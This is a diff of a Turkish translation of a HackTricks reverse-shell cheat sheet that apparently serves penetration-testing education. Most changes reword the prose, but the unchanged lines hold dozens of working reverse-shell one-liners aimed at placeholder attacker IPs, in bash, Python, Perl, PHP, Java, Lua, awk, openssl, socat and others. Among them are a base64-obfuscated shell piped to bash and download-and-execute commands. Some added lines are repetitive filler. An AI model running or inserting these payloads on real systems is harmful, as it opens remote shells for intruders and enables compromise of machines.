@@ -8,7 +8,7 @@ HackTricks'ı desteklemenin diğer yolları:
 
 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i(https://opensea.io/collection/the-peass-family) içeren koleksiyonumuz
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
 * **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
@@ -16,7 +16,7 @@ HackTricks'ı desteklemenin diğer yolları:
 
 **Try Hard Güvenlik Grubu**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -42,8 +42,6 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 exec >&0
 ```
 ### Sembol güvenli kabuk
-
-Diğer kabuklarla da kontrol etmeyi unutmayın: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh ve bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -52,26 +50,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Kabuk açıklaması
+#### Shell açıklaması
 
-1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) bir Bash kabuğu başlatır.
+1. **`bash -i`**: Bu komutun bu kısmı etkileşimli bir (`-i`) Bash kabuğunu başlatır.
 2. **`>&`**: Bu komutun bu kısmı, **standart çıktı** (`stdout`) ve **standart hata** (`stderr`) çıktılarını **aynı hedefe yönlendirmek** için kısa bir notasyondur.
-3. **`/dev/tcp/<SALDIRGAN-IP>/<PORT>`**: Bu, belirtilen IP adresine ve porta **TCP bağlantısını temsil eden özel bir dosyadır**.
+3. **`/dev/tcp/<SALDIRAN-IP>/<PORT>`**: Bu, belirtilen IP adresine ve porta **TCP bağlantısını temsil eden özel bir dosyadır**.
 * **Çıktı ve hata akışlarını bu dosyaya yönlendirerek**, komut etkileşimli kabuk oturumunun çıktısını saldırganın makinesine gönderir.
-4. **`0>&1`**: Bu komutun bu kısmı, **standart girişi (`stdin`) standart çıktıya (`stdout`)** yönlendirir.
+4. **`0>&1`**: Bu komutun bu kısmı, **standart girişi (`stdin`) standart çıktıya (`stdout`) yönlendirir**.
 
 ### Dosyada oluştur ve çalıştır
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## İleriye Dönük Kabuk
+## İleriye Yönlü Kabuk
 
-Linux tabanlı bir web uygulamasında **Uzaktan Kod Yürütme (RCE)** açığıyla uğraşırken, ters kabuk elde etme işlemi, iptables kuralları veya karmaşık paket filtreleme mekanizmaları gibi ağ savunmaları tarafından engellenebilir. Bu tür kısıtlı ortamlarda, alternatif bir yaklaşım, etkilenen sistemle daha etkili bir şekilde etkileşim kurmak için bir PTY (Pseudo Terminal) kabuğu oluşturmaktır.
+Linux tabanlı bir web uygulamasında **Uzaktan Kod Yürütme (RCE)** zafiyeti ile uğraşırken, ters kabuk elde etme işlemi iptables kuralları veya karmaşık paket filtreleme mekanizmaları gibi ağ savunmaları tarafından engellenebilir. Bu tür kısıtlı ortamlarda, bir alternatif yaklaşım, kompromize edilmiş sistemle daha etkili etkileşim kurmak için bir PTY (Pseudo Terminal) kabuk oluşturmaktır.
 
-Bu amaç için önerilen bir araç [toboggan](https://github.com/n3rada/toboggan.git)'dır, bu araç hedef ortamla etkileşimi basitleştirir.
+Bu amaçla önerilen araç [toboggan](https://github.com/n3rada/toboggan.git)'dır, bu araç hedef ortamla etkileşimi basitleştirir.
 
-Toboggan'ı etkili bir şekilde kullanmak için, hedef sistemin RCE bağlamına uygun bir Python modülü oluşturun. Örneğin, `nix.py` adında bir modül aşağıdaki gibi yapılandırılabilir:
+Toboggan'ı etkili bir şekilde kullanmak için, hedef sisteminizin RCE bağlamına uygun bir Python modülü oluşturun. Örneğin, `nix.py` adında bir modül aşağıdaki gibi yapılandırılabilir:
 ```python3
 import jwt
 import httpx
@@ -107,9 +105,9 @@ Sadece şunları değiştirmeniz gerekir:
 
 * Zafiyetli ana bilgisayarın URL'si
 * Yükünüzün öneki ve soneki (varsa)
-* Yükün gönderildiği şekil (başlıklar mı? veri mi? ekstra bilgi mi?)
+* Yükün gönderildiği şekil (başlıklar mı? veri mi? ek bilgi mi?)
 
-Sonra, sadece **komutlar gönderebilirsiniz** veya hatta tam bir PTY almak için **`upgrade` komutunu kullanabilirsiniz** (boruların okunması ve yazılması yaklaşık 1.3 saniyelik bir gecikme ile gerçekleşir).
+Daha sonra, sadece **komutlar gönderebilirsiniz** veya hatta tam bir PTY almak için **`upgrade` komutunu kullanabilirsiniz** (boruların yaklaşık 1.3 saniyelik bir gecikme ile okunduğuna ve yazıldığına dikkat edin).
 
 ## Netcat
 ```bash
@@ -127,7 +125,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet, ağ protokolüdür ve birçok işletim sistemi tarafından desteklenir. Bir sunucuya uzaktan erişim sağlamak için kullanılabilir. Güvenlik nedeniyle, Telnet yerine SSH gibi daha güvenli protokoller tercih edilmelidir.
+Telnet, ağ protokolüdür ve birçok işletim sistemi tarafından desteklenir. Bir hedefe erişmek için kullanılabilir ve hedefin komut satırına erişim sağlar. Güvenli olmadığı için şifreler ve diğer hassas bilgiler açısından risklidir. Açık bir port üzerinden hedefe bağlanmak için kullanılabilir. Telnet, bir hedefe erişmek için kullanılan temel bir araçtır.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -142,13 +140,13 @@ while true; do nc -l <port>; done
 ```
 Komutu göndermek için yazın, enter tuşuna basın ve CTRL+D'ye basın (STDIN'i durdurmak için)
 
-**Hedef**
+**Kurban**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
 ## Python
 
-Python, yüksek seviyeli bir programlama dili ve genel amaçlı bir dil olarak popülerdir. Python, hızlı prototipleme, veri analizi ve otomasyon gibi birçok alanda kullanılır. Ayrıca, çeşitli kütüphaneleri ve modülleri sayesinde geniş bir kullanıcı kitlesine sahiptir.
+Python, yüksek seviyeli bir programlama dili ve genel amaçlı bir dil olarak popülerdir. Hacking ve siber güvenlik alanında kullanılan birçok araç ve teknik Python dilinde yazılmıştır. Python, basit ve okunabilir sözdizimi ile bilinir ve geniş kütüphane desteği sunar.
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -158,7 +156,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl, birçok Linux dağıtımında önceden yüklü olarak gelen bir programlama dilidir. Perl betikleri, Linux üzerinde hızlı ve etkili bir şekilde çalıştırılabilir. Perl, sistem yöneticileri ve güvenlik uzmanları tarafından sıklıkla kullanılan bir dil olduğundan, hedef sistemde Perl yüklü olma olasılığı oldukça yüksektir. Bu nedenle, Perl betikleri sıklıkla hedef sistemlere erişim sağlamak için kullanılır.
+Perl, birçok Linux dağıtımında varsayılan olarak yüklü gelen bir programlama dilidir. Perl betikleri, Linux üzerinde hızlı ve etkili bir şekilde çalıştırılabilir. Perl, sistem yönetimi ve ağ programlaması gibi çeşitli alanlarda kullanılan güçlü bir dil olarak bilinir.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -172,7 +170,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 ```
 ## PHP
 
-PHP, Hypertext Preprocessor'ın kısaltmasıdır ve genellikle web geliştirme için kullanılan bir betik dili olarak bilinir. PHP, sunucu taraflı bir dil olduğundan, sunucuda çalıştırılır ve HTML içine gömülebilir. Dinamik web sayfaları oluşturmak için sıklıkla kullanılır ve veritabanı işlemleri gibi çeşitli görevleri yerine getirebilir.
+PHP, kişisel web sitelerinden büyük kurumsal uygulamalara kadar geniş bir yelpazede kullanılan popüler bir betik dildir. PHP, sunucu taraflı betikleme için özellikle uygun olan açık kaynaklı bir dil olarak bilinir. Web uygulamaları geliştirmek için sıklıkla kullanılır ve genellikle MySQL veritabanı ile entegre edilir.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -186,13 +184,15 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ## Java
 
-Java, Oracle Corporation tarafından geliştirilen ve popüler bir programlama dilidir. Java, nesne yönelimli, sınıf tabanlı ve platform bağımsız bir dildir. Java, genellikle büyük ölçekli uygulamaların geliştirilmesinde tercih edilir ve mobil uygulamalardan büyük veri işleme sistemlerine kadar çeşitli alanlarda kullanılır. Java, geniş kütüphaneleri ve güvenliği ile bilinir.
+Java, Oracle Corporation tarafından geliştirilen ve popüler bir programlama dilidir. Java, nesne yönelimli bir dil olup, platform bağımsızdır ve genellikle büyük ölçekli uygulamaların geliştirilmesinde kullanılır. Java, çok sayıda kütüphane ve araç sunar ve geniş bir topluluğa sahiptir.
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 ## Ncat
+
+Ncat, a modern version of the classic Netcat tool, is a powerful networking utility that can read and write data across networks using TCP or UDP. It is a versatile tool for debugging and investigation during penetration testing.
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
@@ -201,38 +201,13 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 
 ### Linux
 
-#### Reverse Shell
-
-Reverse shell almak için Go programlama dili kullanarak bir reverse shell yazabilirsiniz. Bu, hedef bir Linux makinesine bağlanmanıza olanak tanır.
-
-```go
-package main
-
-import (
-	"fmt"
-	"net"
-	"os/exec"
-)
-
-func main() {
-	conn, _ := net.Dial("tcp", "hedef_ip:port")
-	for {
-		cmd := exec.Command("/bin/sh", "-i")
-		cmd.Stdin = conn
-		cmd.Stdout = conn
-		cmd.Stderr = conn
-	_ = cmd.Run()
-	}
-}
-```
-
-Bu kod, hedef IP adresi ve port numarasını değiştirmeniz gereken basit bir reverse shell örneğidir.
+Golang, Linux'ta oldukça iyi desteklenir ve birçok farklı shell seçeneği vardır. Golang ile yazılmış bir kabuk, hedef sistemde çalıştırılmak üzere derlenebilir. Bu, hedef sistemde özel işlevler gerçekleştirmek için kullanılabilir. Golang ile yazılmış bir kabuk, hedef sistemde çalıştırılmak üzere derlenebilir. Bu, hedef sistemde özel işlevler gerçekleştirmek için kullanılabilir.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua, bir betik dili ve hafif bir çoklu programlama dilidir. Lua, C programlama diline benzer bir sözdizimine sahiptir ve C ile kolayca entegre edilebilir. Lua, oyun geliştirme endüstrisinde ve diğer uygulama alanlarında sıkça kullanılmaktadır. Lua, basit ve hızlı bir şekilde öğrenilebilir ve genellikle betik dili olarak kullanılır. Lua, esnek bir dil olup, farklı programlama paradigmasını destekler. Lua, açık kaynak kodlu bir projedir ve aktif bir topluluğa sahiptir.
+Lua, bir betik dili ve hafif bir programlama dili olarak kullanılan bir betik dili ve hafif bir programlama dilidir. Lua, C programlama dili ile kolayca entegre edilebilir ve genellikle oyun geliştirme ve uygulama betikleme için kullanılır. Lua, basit sözdizimi ve hızlı yürütme süresi ile bilinir. Lua, esnek bir dil olup, çeşitli platformlarda çalışabilir.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -290,7 +265,9 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Kurban
+### Kurban
+
+Kurban, saldırganın hedef aldığı kişiyi veya cihazı temsil eder. Saldırgan, kurban üzerinde çeşitli saldırı teknikleri kullanarak hassas bilgilere erişmeyi hedefler. Kurban genellikle saldırganın hedefine ulaşmak için zayıf bir halka olarak görülür.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -314,7 +291,9 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk, Linux'ta sıkça kullanılan bir komut satırı aracıdır. Metin dosyalarını işlemek için kullanılır ve genellikle metin işleme ve veri çıkarma işlemlerinde kullanılır. Awk, metin dosyalarını satır satır okur, belirli desenlere göre satırları işler ve belirli eylemler gerçekleştirir. Awk, komut satırında kullanıldığında oldukça güçlü ve esnek bir araçtır.
+## Awk
+
+Awk, Linux'ta sıkça kullanılan bir metin işleme aracıdır. Metin dosyalarını satır satır okuyarak belirli koşullara uyan satırları işleyebilir ve istenilen çıktıyı üretebilir. Awk, genellikle komut satırında kullanılan bir araçtır ve betik dili olarak da kullanılabilir. Awk'ın esnek ve güçlü yapısı, dosya işleme ve veri çıkarma işlemlerinde oldukça faydalı olabilir. Awk, genellikle diğer Linux komutlarıyla birlikte kullanılarak daha karmaşık işlemler gerçekleştirmek için kullanılır.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -326,7 +305,7 @@ while true; do nc -l 79; done
 ```
 Komutu göndermek için yazın, enter tuşuna basın ve CTRL+D'ye basın (STDIN'i durdurmak için)
 
-**Hedef**
+**Kurban**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -336,7 +315,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 
 ### Gawk
 
-Gawk, GNU Project tarafından geliştirilen bir metin işleme dili ve programlama ortamıdır. Genellikle metin dosyalarını işlemek için kullanılır. Gawk, Linux sistemlerinde sıkça kullanılan bir araçtır ve metin işleme, veri çıkarma ve raporlama gibi görevler için oldukça güçlü bir araçtır. Gawk'ın esnek ve güçlü bir dil olması, onu birçok farklı senaryoda kullanılabilir kılar.
+Gawk, GNU awk'ın bir uygulamasıdır. Gawk, metin işleme ve veri çıkarma için kullanılan bir programlama dilidir. Gawk, genellikle metin dosyalarını işlemek ve düzenlemek için kullanılır. Gawk, Linux sistemlerinde sıkça kullanılan bir araçtır.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -390,20 +369,20 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* Şirketinizi HackTricks'te **tanıtmak istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
